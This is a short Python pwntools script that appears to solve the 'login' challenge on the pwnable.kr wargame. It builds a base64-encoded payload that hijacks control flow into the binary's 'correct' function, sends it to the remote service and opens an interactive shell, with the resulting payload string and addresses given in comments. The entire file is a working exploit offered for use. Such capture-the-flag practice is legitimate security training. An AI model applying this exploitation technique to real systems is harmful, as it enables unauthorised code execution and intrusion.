from pwn import *

io = remote('pwnable.kr', 9003)
elf = ELF('./login')
input_addr = elf.sym["input"]  # 0x811eb40
shell_addr = elf.sym["correct"] + 37  # 0x8049284
payload = cyclic(4) + p32(shell_addr) + p32(input_addr)
payload = b64e(payload)  # 'YWFhYYSSBAhA6xEI'
log.success('Authenticate: %s' % payload)
io.sendlineafter("Authenticate : ", payload)
io.interactive()